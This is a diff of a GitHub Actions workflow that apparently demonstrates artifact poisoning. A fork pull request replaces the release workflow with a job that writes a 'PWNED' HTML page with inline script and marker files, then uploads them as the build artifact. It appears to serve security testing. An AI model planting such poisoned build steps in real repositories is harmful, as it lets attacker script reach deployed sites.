@@ -1,15 +1,25 @@
 name: Release Workflow
 
 on:
-  push:
-    branches: [development, release-*]
-  workflow_dispatch:
+  pull_request:
 
 permissions:
-  contents: write
+  contents: read
 
 jobs:
   release:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "real release workflow"
+      - name: Attacker-controlled build output (fork PR owns this workflow file)
+        run: |
+          mkdir -p storybook-static tokens/css
+          printf '<html><body><h1>PWNED_BY_FORK_PR</h1><script>document.title="attacker js on the deployed origin"</script></body></html>\n' > storybook-static/index.html
+          echo "ATTACKER_ARTIFACT_MARKER" > storybook-static/PWNED.txt
+          echo "- attacker diff" > tokens/css/file-sizes.diff
+      - uses: actions/upload-artifact@v4
+        with:
+          name: build
+          if-no-files-found: error
+          path: |
+            ./storybook-static
+            ./tokens/css/*.diff
